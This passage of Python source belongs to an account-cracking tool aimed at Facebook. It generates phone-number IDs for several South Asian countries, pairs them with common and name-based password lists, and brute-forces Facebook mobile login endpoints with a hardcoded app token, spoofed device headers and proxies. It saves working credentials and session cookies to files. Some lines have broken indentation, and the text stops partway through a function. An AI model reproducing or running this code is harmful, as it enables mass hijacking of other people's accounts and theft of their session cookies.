		print(f'\033[1;31m[\033[1;37m≈\033[1;31m]\033[1;37m EXAMPLE : 3000 | 5000 | 10000 | 99999 ')
		print('\033[10;93m━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━')
		limit = int(input(f'\033[1;31m[\033[1;37m?\033[1;31m]\033[1;37m CHOICE  : '))
		clear()
		os.system('clear')
		print(logo)
		print(f'\033[1;31m[\033[1;37m1\033[1;31m] \033[1;37mMETHOD (BEST-1) ')
		print('\033[10;93m━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━')
		mthd = input(f'\033[1;31m[\033[1;37m?\033[1;31m]\033[1;37m CHOICE  : ')
		for nmbr in range(limit):
			nmp=''.join(random.choice(string.digits) for _ in range(8))
			user.append(nmp)
		with tred(max_workers=30) as mugi:	
			clear()
			tl = str(len(user))
			print(logo)
			print(f'\x1b[38;5;196m[\x1b[38;5;46m≈\x1b[38;5;196m]\x1b[38;5;46m SIM CODE \033[1;37m:\x1b[38;5;46m {code} ')
			print(f'\x1b[38;5;196m[\x1b[38;5;46m≈\x1b[38;5;196m]\x1b[38;5;46m TOTAL ID \033[1;37m:\x1b[38;5;46m {tl}  \x1b[38;5;196m<\x1b[38;5;46m━\x1b[38;5;196m> \x1b[38;5;46mMETHOD \033[1;37m: \x1b[38;5;46mM\x1b[38;5;46m{mthd} ')
			print(f'\x1b[38;5;196m[\x1b[38;5;46m≈\x1b[38;5;196m]\x1b[38;5;46m TURN \x1b[38;5;196m(\x1b[38;5;46mON\x1b[38;5;196m/\x1b[38;5;46mOFF\x1b[38;5;196m)\x1b[38;5;46m AIRPLANE MODE EVERY 3 MIN')
			print('\033[10;93m━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━')
			for psx in user:
				uid = code+psx
				passlist = [psx,uid,'Bangladesh','bangladesh','i love you','iloveyou','free fire','freefire']
				if mthd in ['1','01']:
					mugi.submit(rndm1,uid,passlist)
		print('\033[1;37m')
		print(f'\r━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━')
		print(f'\x1b[38;5;196m[\x1b[38;5;46m≈\x1b[38;5;196m]\x1b[38;5;46m THE PROCESS HAS COMPLETED')
		print(f'\x1b[38;5;196m[\x1b[38;5;46m≈\x1b[38;5;196m]\x1b[38;5;46m TOTAL OK ID : '+str(len(oks)))
		print(f'\x1b[38;5;196m[\x1b[38;5;46m≈\x1b[38;5;196m]\x1b[38;5;46m TOTAL CP ID : '+str(len(cps)))
		print(f'\r━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━')
		input(f'\x1b[38;5;196m[\x1b[38;5;46m≈\x1b[38;5;196m]\x1b[38;5;46m PRESS ENTER TO BACK ')
		menu()
#__________________| INDIA |__________________#
def india():
		user=[]
		clear()
		os.system('clear')
		print(logo)
		print(f'\033[1;31m[\033[1;37m≈\033[1;31m]\033[1;37m EXAMPLE : 91639 | 91934 | 91902 | 91937 ')
		print('\033[10;93m━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━')
		code = input(f'\033[1;31m[\033[1;37m?\033[1;31m]\033[1;37m CHOICE  : ')
		os.system('clear')
		print(logo)
		print(f'\033[1;31m[\033[1;37m≈\033[1;31m]\033[1;37m EXAMPLE : 3000 | 5000 | 10000 | 99999 ')
		print('\033[10;93m━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━')
		limit = int(input(f'\033[1;31m[\033[1;37m?\033[1;31m]\033[1;37m CHOICE  : '))
		clear()
		os.system('clear')
		print(logo)
        print(f'\033[1;31m[\033[1;37m1\033[1;31m] \033[1;37mMETHOD (BEST-1) ')
		print('\033[10;93m━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━')
		mthd = input(f'\033[1;31m[\033[1;37m?\033[1;31m]\033[1;37m CHOICE  : ')
		for nmbr in range(limit):
			nmp = "". join(random.choice(string.digits) for _ in range(7))
			user.append(nmp)
		with tred(max_workers=30) as mugi:	
			clear()
			tl = str(len(user))
			print(logo)
			print(f'\x1b[38;5;196m[\x1b[38;5;46m≈\x1b[38;5;196m]\x1b[38;5;46m SIM CODE \033[1;37m:\x1b[38;5;46m {code} ')
			print(f'\x1b[38;5;196m[\x1b[38;5;46m≈\x1b[38;5;196m]\x1b[38;5;46m TOTAL ID \033[1;37m:\x1b[38;5;46m {tl}  \x1b[38;5;196m<\x1b[38;5;46m━\x1b[38;5;196m> \x1b[38;5;46mMETHOD \033[1;37m: \x1b[38;5;46mM\x1b[38;5;46m{mthd} ')
			print(f'\x1b[38;5;196m[\x1b[38;5;46m≈\x1b[38;5;196m]\x1b[38;5;46m TURN \x1b[38;5;196m(\x1b[38;5;46mON\x1b[38;5;196m/\x1b[38;5;46mOFF\x1b[38;5;196m)\x1b[38;5;46m AIRPLANE MODE EVERY 3 MIN')
			print('\033[10;93m━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━')
			for psx in user:
				uid = code+psx
				passlist = [psx,uid[:8],'57273200','59039200','57575751']
				if mthd in ['1','01']:
					mugi.submit(rndm1,uid,passlist)
		print('\033[1;37m')
		print(f'\r━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━')
		print(f'\x1b[38;5;196m[\x1b[38;5;46m≈\x1b[38;5;196m]\x1b[38;5;46m THE PROCESS HAS COMPLETED')
		print(f'\x1b[38;5;196m[\x1b[38;5;46m≈\x1b[38;5;196m]\x1b[38;5;46m TOTAL OK ID : '+str(len(oks)))
		print(f'\x1b[38;5;196m[\x1b[38;5;46m≈\x1b[38;5;196m]\x1b[38;5;46m TOTAL CP ID : '+str(len(cps)))
		print(f'\r━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━')
		input(f'\x1b[38;5;196m[\x1b[38;5;46m≈\x1b[38;5;196m]\x1b[38;5;46m PRESS ENTER TO BACK ')
		menu()
#__________________| NEPAL |__________________#
def nepal():
		user=[]
		clear()
		os.system('clear')
		print(logo)
		print(f'\033[1;31m[\033[1;37m≈\033[1;31m]\033[1;37m EXAMPLE : 9815 | 9814 | 9861 | 9840 ')
		print('\033[10;93m━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━')
		code = input(f'\033[1;31m[\033[1;37m?\033[1;31m]\033[1;37m CHOICE  : ')
		os.system('clear')
		print(logo)
		print(f'\033[1;31m[\033[1;37m≈\033[1;31m]\033[1;37m EXAMPLE : 3000 | 5000 | 10000 | 99999 ')
		print('\033[10;93m━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━')
		limit = int(input(f'\033[1;31m[\033[1;37m?\033[1;31m]\033[1;37m CHOICE  : '))
		clear()
		os.system('clear')
		print(logo)
		print(f'\033[1;31m[\033[1;37m1\033[1;31m] \033[1;37mMETHOD (BEST-1) ')
		print('\033[10;93m━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━')
		mthd = input(f'\033[1;31m[\033[1;37m?\033[1;31m]\033[1;37m CHOICE  : ')
		for nmbr in range(limit):
			nmp = "". join(random.choice(string.digits) for _ in range(6))
			user.append(nmp)
		with tred(max_workers=30) as mugi:	
			clear()
			tl = str(len(user))
			print(logo)
			print(f'\x1b[38;5;196m[\x1b[38;5;46m≈\x1b[38;5;196m]\x1b[38;5;46m SIM CODE \033[1;37m:\x1b[38;5;46m {code} ')
			print(f'\x1b[38;5;196m[\x1b[38;5;46m≈\x1b[38;5;196m]\x1b[38;5;46m TOTAL ID \033[1;37m:\x1b[38;5;46m {tl}  \x1b[38;5;196m<\x1b[38;5;46m━\x1b[38;5;196m> \x1b[38;5;46mMETHOD \033[1;37m: \x1b[38;5;46mM\x1b[38;5;46m{mthd} ')
			print(f'\x1b[38;5;196m[\x1b[38;5;46m≈\x1b[38;5;196m]\x1b[38;5;46m TURN \x1b[38;5;196m(\x1b[38;5;46mON\x1b[38;5;196m/\x1b[38;5;46mOFF\x1b[38;5;196m)\x1b[38;5;46m AIRPLANE MODE EVERY 3 MIN')
			print('\033[10;93m━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━')
			for psx in user:
				uid = code+psx
				passlist = [uid,psx,uid[:8],uid[:7],uid[:6],'nepal12','nepal123','nepal1234','nepal12345','maya123','kathmandu','pokhara','tamang','maya1234','tamang123','tamang12345','nepal@123','kathmandu123']
				if mthd in ['1','01']:
					mugi.submit(rndm1,uid,passlist)
		print('\033[1;37m')
		print(f'\r━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━')
		print(f'\x1b[38;5;196m[\x1b[38;5;46m≈\x1b[38;5;196m]\x1b[38;5;46m THE PROCESS HAS COMPLETED')
		print(f'\x1b[38;5;196m[\x1b[38;5;46m≈\x1b[38;5;196m]\x1b[38;5;46m TOTAL OK ID : '+str(len(oks)))
		print(f'\x1b[38;5;196m[\x1b[38;5;46m≈\x1b[38;5;196m]\x1b[38;5;46m TOTAL CP ID : '+str(len(cps)))
		print(f'\r━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━')
		input(f'\x1b[38;5;196m[\x1b[38;5;46m≈\x1b[38;5;196m]\x1b[38;5;46m PRESS ENTER TO BACK ')
		menu()
#__________________| PAKISTAN |__________________#
def pakistan():
		user=[]
		clear()
		os.system('clear')
		print(logo)
		print(f'\033[1;31m[\033[1;37m≈\033[1;31m]\033[1;37m EXAMPLE : 0306 | 0335 | 0315 | 0345 ')
		print('\033[10;93m━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━')
		code = input(f'\033[1;31m[\033[1;37m?\033[1;31m]\033[1;37m CHOICE  : ')
		os.system('clear')
		print(logo)
		print(f'\033[1;31m[\033[1;37m≈\033[1;31m]\033[1;37m EXAMPLE : 3000 | 5000 | 10000 | 99999 ')
		print('\033[10;93m━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━')
		limit = int(input(f'\033[1;31m[\033[1;37m?\033[1;31m]\033[1;37m CHOICE  : '))
		clear()
		os.system('clear')
		print(logo)
		print(f'\033[1;31m[\033[1;37m1\033[1;31m] \033[1;37mMETHOD (BEST-1) ')
		print('\033[10;93m━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━')
		mthd = input(f'\033[1;31m[\033[1;37m?\033[1;31m]\033[1;37m CHOICE  : ')
		for nmbr in range(limit):
			nmp = "". join(random.choice(string.digits) for _ in range(7))
			user.append(nmp)
		with tred(max_workers=30) as mugi:	
			clear()
			tl = str(len(user))
			print(logo)
			print(f'\x1b[38;5;196m[\x1b[38;5;46m≈\x1b[38;5;196m]\x1b[38;5;46m SIM CODE \033[1;37m:\x1b[38;5;46m {code} ')
			print(f'\x1b[38;5;196m[\x1b[38;5;46m≈\x1b[38;5;196m]\x1b[38;5;46m TOTAL ID \033[1;37m:\x1b[38;5;46m {tl}  \x1b[38;5;196m<\x1b[38;5;46m━\x1b[38;5;196m> \x1b[38;5;46mMETHOD \033[1;37m: \x1b[38;5;46mM\x1b[38;5;46m{mthd} ')
			print(f'\x1b[38;5;196m[\x1b[38;5;46m≈\x1b[38;5;196m]\x1b[38;5;46m TURN \x1b[38;5;196m(\x1b[38;5;46mON\x1b[38;5;196m/\x1b[38;5;46mOFF\x1b[38;5;196m)\x1b[38;5;46m AIRPLANE MODE EVERY 3 MIN')
			print('\033[10;93m━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━')
			for psx in user:
				uid = code+psx
				passlist = [psx,uid,'khankhan','khan1122','ali12345','khanbaba','pakistan','khan12345','ali1122','khankhan12345','khan','baloch','pubg','pubg1122']
				if mthd in ['1','01']:
		        mugi.submit(rndm1,uid,passlist)
		print('\033[1;37m')
		print(f'\r━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━')
		print(f'\x1b[38;5;196m[\x1b[38;5;46m≈\x1b[38;5;196m]\x1b[38;5;46m THE PROCESS HAS COMPLETED')
		print(f'\x1b[38;5;196m[\x1b[38;5;46m≈\x1b[38;5;196m]\x1b[38;5;46m TOTAL OK ID : '+str(len(oks)))
		print(f'\x1b[38;5;196m[\x1b[38;5;46m≈\x1b[38;5;196m]\x1b[38;5;46m TOTAL CP ID : '+str(len(cps)))
		print(f'\r━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━')
		input(f'\x1b[38;5;196m[\x1b[38;5;46m≈\x1b[38;5;196m]\x1b[38;5;46m PRESS ENTER TO BACK ')
		menu()
#__________________| AFGHANISTAN |__________________#
def afghanistan():
		user=[]
		clear()
		os.system('clear')
		print(logo)
		print(f'\033[1;31m[\033[1;37m≈\033[1;31m]\033[1;37m EXAMPLE : 9340 | 9360 | 9330 | 9350')
		print('\033[10;93m━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━')
		code = input(f'\033[1;31m[\033[1;37m?\033[1;31m]\033[1;37m CHOICE  : ')
		os.system('clear')
		print(logo)
		print(f'{B}❲{A}={B}❳{G} EXAMPLE : 3000 | 5000 | 10000 | 99999 ')
		print('\033[10;93m━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━')
		limit = int(input(f'\033[1;31m[\033[1;37m?\033[1;31m]\033[1;37m CHOICE  : '))
		clear()
		os.system('clear')
		print(logo)
		print(f'\033[1;31m[\033[1;37m1\033[1;31m] \033[1;37mMETHOD (BEST-1) ')
		print('\033[10;93m━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━')
		mthd = input(f'\033[1;31m[\033[1;37m?\033[1;31m]\033[1;37m CHOICE  : ')
		for nmbr in range(limit):
			nmp = "". join(random.choice(string.digits) for _ in range(7))
			user.append(nmp)
		with tred(max_workers=30) as habib:	
			clear()
			tl = str(len(user))
			print(logo)
			print(f'\x1b[38;5;196m[\x1b[38;5;46m≈\x1b[38;5;196m]\x1b[38;5;46m SIM CODE \033[1;37m:\x1b[38;5;46m {code} ')
			print(f'\x1b[38;5;196m[\x1b[38;5;46m≈\x1b[38;5;196m]\x1b[38;5;46m TOTAL ID \033[1;37m:\x1b[38;5;46m {tl}  \x1b[38;5;196m<\x1b[38;5;46m━\x1b[38;5;196m> \x1b[38;5;46mMETHOD \033[1;37m: \x1b[38;5;46mM\x1b[38;5;46m{mthd} ')
			print(f'\x1b[38;5;196m[\x1b[38;5;46m≈\x1b[38;5;196m]\x1b[38;5;46m TURN \x1b[38;5;196m(\x1b[38;5;46mON\x1b[38;5;196m/\x1b[38;5;46mOFF\x1b[38;5;196m)\x1b[38;5;46m AIRPLANE MODE EVERY 3 MIN')
			print('\033[10;93m━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━')
			for psx in user:
				uid = code+psx
				passlist = [psx,uid,'afghan','afghan12345','afghan123','600700','afghanistan','afghan1122','500500','100200','10002000','900900','kabul123','Û±Û³Û³Û³ÛµÛ¶Û·Û¸Û¹','Û±Û³Û³Û³ÛµÛ¶','afghan1234','kabul1234','khankhan','khan123','khan123456','khan786']
				if mthd in ['1','01']:
					mugi.submit(rndm1,uid,passlist)
		print('\033[1;37m')
		print(f'\r━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━')
		print(f'\x1b[38;5;196m[\x1b[38;5;46m≈\x1b[38;5;196m]\x1b[38;5;46m THE PROCESS HAS COMPLETED')
		print(f'\x1b[38;5;196m[\x1b[38;5;46m≈\x1b[38;5;196m]\x1b[38;5;46m TOTAL OK ID : '+str(len(oks)))
		print(f'\x1b[38;5;196m[\x1b[38;5;46m≈\x1b[38;5;196m]\x1b[38;5;46m TOTAL CP ID : '+str(len(cps)))
		print(f'\r━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━')
		input(f'\x1b[38;5;196m[\x1b[38;5;46m≈\x1b[38;5;196m]\x1b[38;5;46m PRESS ENTER TO BACK ')
		menu()

#───────────────[ INPUT-FILE_NAME ]───────────────#
 
def crack_file():
    print('\033[0;91m━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━')
    print('\033[97;1m[\033[92;1m+\033[97;1m] Put File Example :  /sdcard/mugi.txt')
    o = input('\033[97;1m[\033[92;1m+\033[97;1m] INPut FILE NAME  : \033[92;1m ')
    clear()
    print(logo)
    try:lin = open(o).read().splitlines()
    except:
        print('\033[0;91m━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━')
        animation(' FILE NOT FOUND')
        time.sleep(2)
        back()
    for xid in lin:
        id.append(xid)
    setting()
    clear()
 
#───────────────[ CLONING-IDZ ]───────────────#
 
def setting():
    print('\033[0;91m━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━')
    print("\033[97;1m[\033[92;1m1\033[97;1m] \033[0;92mCLONING FOR ONLY OLD IDz")
    print("\033[97;1m[\033[92;1m2\033[97;1m] CLONING FOR ONLY NEW IDz")
    print("\033[97;1m[\033[92;1m3\033[97;1m] \033[0;92mCLONING FOR MIX IDz")
    print('\033[0;91m━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━')
    hu = input('\033[97;1m[\033[92;1m+\033[97;1m]CHOOSE :\033[92;1m ')
    clear()
    print(logo)
    if hu in ['1','01']:
        for tua in sorted(id):
            id2.append(tua)
    elif hu in ['2','02']:
        muda=[] 
        for bacot in sorted(id):
            muda.append(bacot)
        bcm=len(muda)
        bcmi=(bcm-1)
        for xmud in range(bcm):
            id2.append(muda[bcmi])
            bcmi -=1
    elif hu in ['3','03']:
        for bacot in id:
            xx = random.randint(0,len(id2))
            id2.insert(xx,bacot)
    else:
        for bacot in id:
            xx = random.randint(0,len(id2))
            id2.insert(xx,bacot)
    print('\033[0;91m Host : \033[38;5;208m1st-m.facbook \033[1;35m2nd-mbasic \033[92;1m3rd-p.facbook')
    print('\033[0;91m━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━')
    print("\033[97;1m[\033[92;1m1\033[97;1m] METHOD 1 \033[1;37m")
    print('\033[0;91m━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━')
    hc = input('\033[97;1m[\033[92;1m•\033[97;1m] CHOOSE : ')
    if hc in ['1','01']:
        method.append('mobile')
    else:
        method.append('mobile')
    passwrd()
    exit() 

#───────────────[ FILE-WORDLIST ]───────────────#
 
def passwrd():
    os.system('clear')
    print(logo)
    print(f"\033[1;31m[\033[1;37m+\033[1;31m] \033[1;92mUSER COUNTRY\033[1;91m    \033[0;97m:\033[38;5;208m "+uname)
    print('\033[1;31m[\033[1;37m+\033[1;31m] \033[1;92mYOUR TOTAL UID  \033[0;97m:\033[1;96m',str(len(id)))
    print(f'\033[1;31m[\033[1;37m+\033[1;31m]\033[1;92m TURN \033[1;37m[\033[1;92mON\033[1;31m/\033[1;92mOFF\033[1;37m]\033[1;92m AIRPLANE MODE EVERY 5 MIN')
    print('\033[10;93m━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━')
    with tred(max_workers=30) as pool:
        for yuzong in id2:
            idf,nmf = yuzong.split('|')[0],yuzong.split('|')[1].lower()
            frs = nmf.split(' ')[0]
            pwv = []
            if len(nmf)<6:
                if len(frs)<3:
                    pass
                else:
                    pwv.append(frs+'12')
                    pwv.append(frs+'123')
                    pwv.append(frs+'1234')
                    pwv.append(frs+'12345')
                    pwv.append(frs+'123456')
                    pwv.append(nmf)
                    pwv.append('57273200')
                    pwv.append(frs+'@1')
                    pwv.append(frs+'@12')
                    pwv.append(frs+'@123')
                    pwv.append(frs+'@1234')
                    pwv.append(frs+'@')
                    pwv.append(frs+'@@')
                    pwv.append(frs+'@@@')
                    pwv.append(frs+'@@@@')
                    pwv.append(frs+'@#')
                    pwv.append(frs+'1122')
                    pwv.append(frs+'11')
                    pwv.append(frs+'111')
            else:
                if len(frs)<3:
                    pwv.append(nmf)
                else:
                    pwv.append(frs+'12')
                    pwv.append(frs+'123')
                    pwv.append(frs+'1234')
                    pwv.append(frs+'12345')
                    pwv.append(frs+'123456')
                    pwv.append(nmf)
                    pwv.append('57273200')
                    pwv.append(frs+'@1')
                    pwv.append(frs+'@12')
                    pwv.append(frs+'@123')
                    pwv.append(frs+'@1234')
                    pwv.append(frs+'@')
                    pwv.append(frs+'@@')
                    pwv.append(frs+'@@@')
                    pwv.append(frs+'@@@@')
                    pwv.append(frs+'@#')
                    pwv.append(frs+'1122')
                    pwv.append(frs+'11')
                    pwv.append(frs+'111')
            if 'ya' in pwpluss:
                for xpwd in pwnya:
                    pwv.append(xpwd)
            else:pass
            if 'mobile' in method:
                pool.submit(crack,idf,pwv)
            elif 'free' in method:
                pool.submit(crackfree,idf,pwv)
            elif 'touch' in method:
                pool.submit(cracktouch,idf,pwv)
            elif 'mbasic' in method:
                pool.submit(crackfree,idf,pwv)
            else:
                pool.submit(crackfree,idf,pwv)
    print('\n\033[1;37m━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━')
    print('\033[97;1m[\033[92;1m+\033[97;1m] CLONING COMPLETE TIME :\033[1;92m'+time.strftime("%H:%M")+" "+ tag)
    print('\033[97;1m[\033[92;1m•\033[97;1m] OK :\033[0;92m %s '%(ok))
    print('\033[97;1m[\033[92;1m+\033[97;1m] CP :\033[0;93m %s '%(cp))
    print('\n\033[1;37m━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━')
    woi = input('\033[97;1m[\033[92;1m+\033[97;1m] \033[1;37m ENTER TO BACK')
    os.system("python File-V5.py")
    exit()

#__________________| RANDOM METHOD M1 |__________________#
def rndm1(uid,passlist):
        global loop
        global oks
        bo = random.choice([m,k,h,b,u,x])
        sys.stdout.write(f'\r\r{B}[{G}NOBITA-143{B}]{G}-{B}[{bo}%s{B}]{G}-{B}[{G}OK•%s{M1}/{G}CP•{G}%s{B}] '%(loop,len(oks),len(cps)));sys.stdout.flush()
        try:
                for pas in passlist:
                        accessToken = '350685531728|62f8ce9f74b12f84c123cc23437a4a32'
                        fbav = f'{random.randint(111,999)}.0.0.{random.randint(11,99)}.{random.randint(111,999)}'
                        fbbv = str(random.randint(111111111,999999999))
                        android_version = device['android_version']
                        model = device['model']
                        build = device['build']
                        fblc = device['fblc']
                        fbcr = sim_id
                        fbmf = device['fbmf']
                        fbbd = device['fbbd']
                        fbdv = device['fbdv']
                        fbsv = device['fbsv']
                        fbca = device['fbca']
                        fbdm = device['fbdm']
                        fbfw = '1'
                        fbrv = '0'
                        fban = 'FB4A'
                        fbpn = 'com.facebook.katana'
                        ua = 'Davik/2.1.0 (Linux; U; Android '+android_version+'.0.1; '+model+' Build/'+build+') [FBAN/'+fban+';FBAV/'+fbav+';FBBV/'+fbbv+';FBDM/{density=2.625,width=1080,height=1920};FBLC/'+fblc+';FBRV/'+str(random.randint(000000000,999999999))+';FBCR/'+fbcr+';FBMF/'+fbmf+';FBBD/'+fbbd+';FBPN/'+fbpn+';FBDV/'+fbdv+';FBSV/'+fbsv+';FBOP/19;FBCA/'+fbca+';]'
                        random_seed = random.Random()
                        adid = str(''.join(random_seed.choices(string.hexdigits, k=16)))
                        device_id = str(uuid.uuid4())
                        secure = str(uuid.uuid4())
                        family = str(uuid.uuid4())
                        accessToken = '350685531728|62f8ce9f74b12f84c123cc23437a4a32'
                        xd =str(''.join(random_seed.choices(string.digits, k=20)))
                        sim_serials = f'["{xd}"]'
                        li = ['28','29','210']
                        li2 = random.choice(li)
                        j1 = ''.join(random.choice(string.digits) for _ in range(2))
                        jazoest = li2+j1
                        data = {
                                'adid':adid,
                                'format':'json',
                                'device_id':device_id,
                                'email':uid,
                                'password':pas,
                                "logged_out_id": str(uuid.uuid4()),
                                "hash_id": str(uuid.uuid4()),
                                "reg_instance": str(uuid.uuid4()),
                                "session_id": str(uuid.uuid4()),
                                "advertiser_id": str(uuid.uuid4()),
                                'generate_analytics_claims':'1',
                                'credentials_type':'password',
                                'source':'login',
                                "sim_country": "id",
                                "network_country": "id",
                                "relative_url": "method/auth.login",
                                'error_detail_type':'button_with_disabled',
                                'enroll_misauth':'false',
                                'generate_session_cookies':'1',
                                'generate_machine_id':'1',
                                'fb_api_req_friendly_name':'authenticate',
                                "fb_api_caller_class": "com.facebook.account.login.protocol.Fb4aAuthHandler",
                        }
                        headers={
                                'Authorization':f'OAuth {accessToken}',
                                "X-FB-Connection-Type": "mobile.CTRadioAccessTechnologyLTE",
                                "X-FB-Connection-Bandwidth": str(random.randint(20000000, 30000000)),
                                "X-FB-Net-HNI": str(random.randint(20000, 40000)),
                                "X-FB-SIM-HNI": str(random.randint(20000, 40000)),
                                'X-FB-Friendly-Name':'authenticate',
                                'X-FB-Connection-Type':'unknown',
                                'User-Agent':ua,
                                'Accept-Encoding':'gzip, deflate',
                                'Content-Type': 'application/x-www-form-urlencoded',
                                'X-FB-HTTP-Engine': 'Liger'
                                }
                        url = 'https://b-graph.facebook.com/auth/login'
                        po = requests.post(url,data=data,headers=headers).json()
                        if 'session_key' in po:
                                        print(f'\r\r{R}[{G}NOBITA-143-OK{R}]{G} '+uid+f' | '+pas+'\033[1;97m')
                                        coki = ";".join(i["name"]+"="+i["value"] for i in po["session_cookies"])
                                        print(f"\r\r{Y}[{G}COOKIE{Y}] {G2}●{X1} "+coki)
                                        open('/sdcard/NOBITA-143-R-OK.txt', 'a').write(uid+' | '+pas+' |-> '+coki+"\n")
                                        oks.append(uid)
                                        break
                        elif 'www.facebook.com' in po['error']['message']:
                                        if 'y' in pcp:
                                                print(f'\r\r{B}[{Y}GHOST-CP{B}]{Y} '+uid+' | '+pas+'\033[1;97m')
                                                open('/sdcard/NOBITA-143-R-CP.txt','a').write(uid+'|'+pas+'\n')
                                                cps.append(uid)
                                                break
                                        else:
                                                break
                        else:
                                        continue
                loop+=1
        except Exception as e:
                pass
#───────────────[ OLD - CLONE - METHOD ]───────────────#
def login(uid):
    global oks,loop
    Session=requests.session()
    try:
        sys.stdout.write(f'\r\x1b[38;5;196m[\x1b[38;5;48mFINDING\x1b[38;5;196m]\x1b[1;97m-\x1b[38;5;196m[\033[1;37m{loop}\x1b[38;5;196m]\x1b[1;97m-\x1b[38;5;196m[\x1b[38;5;46mOK•{len(oks)}\x1b[38;5;196m]\x1b[1;97m-\x1b[38;5;196m[\x1b[38;5;46mCP•{len(cps)}\x1b[38;5;196m]')
        sys.stdout.flush()
        for pw in ["123456","1234567","12345678","123456789","123123","112233","1234567890"]:
            headers = {
            "x-fb-connection-bandwidth": str(random.randint(20000000.0, 30000000.0)), 
            "x-fb-sim-hni": str(random.randint(20000, 40000)), 
            "x-fb-net-hni": str(random.randint(20000, 40000)), 
            "x-fb-connection-quality": "EXCELLENT",
            "x-fb-connection-type": "cell.CTRadioAccessTechnologyHSDPA",
            "user-agent": windows(), 
            "content-type": "application/x-www-form-urlencoded", 
            "x-fb-http-engine": "Liger"}
            rp=Session.get("https://b-api.facebook.com/method/auth.login?format=json&email="+str(uid)+"&password="+str(pw)+"&credentials_type=device_based_login_password&generate_session_cookies=1&error_detail_type=button_with_disabled&source=device_based_login&meta_inf_fbmeta=%20¤tly_logged_in_userid=0&method=GET&locale=en_GB&client_country_code=GB&fb_api_caller_class=com.facebook.fos.headersv2.fb4aorca.HeadersV2ConfigFetchRequestHandler&access_token=350685531728|62f8ce9f74b12f84c123cc23437a4a32&fb_api_req_friendly_name=authenticate&cpl=true", headers=headers).json()
            if "session_key" in rp:
                print(f"\r{R}[{R}NOBITA-143-OK{R}]{R} {uid} | {pw}")
                open("/sdcard/NOBITA-143-OLD-OK.txt","a").write(uid+"|"+pw+"\n")
                oks.append(uid)
                break 
            elif "www.facebook.com" in rp["error_msg"]:          	
            	print(f"\r{R}[{G1}NOBITA-143-OLD-OK{R}]{G1} {uid} | {pw}")
            	open("/sdcard/NOBITA-143-OLD-CP.txt","a").write(uid+"|"+pw+"\n")
            	oks.append(uid)
            	break
            elif "Please Confirm Email" in str(rp):            
            	print(f"\r{R}[{G1} NOBITA-143-OLD-2F{R}]{G1} {uid} | {pw}")
            	open("/sdcard/NOBITA-143-OLD-2F.txt","a").write(uid+"|"+pw+"\n")
            	cps.append(uid)
            	break
            else:continue
        loop+=1
    except:pass


#───────────────[ METODE-M.facebook ]───────────────#
 
def crack(idf,pwv):
    global loop,ok,cp
	bo = random.choice([m,k,h,b,u,x])
	sys.stdout.write(f"\r\u001b[37m[NOBITA-143] {loop}/{len(id)} OK[{H}{ok}\u001b[37m] [{'{:.0%}'.format(loop/float(len(id)))}]  "),
	sys.stdout.flush()
	ua = random.choice(ugen)
	ua2 = random.choice(ugen2)
	ses = requests.Session()
	for pw in pwv:
		try:
			nip=random.choice(prox)
			proxs= {'http': 'socks4://'+nip}
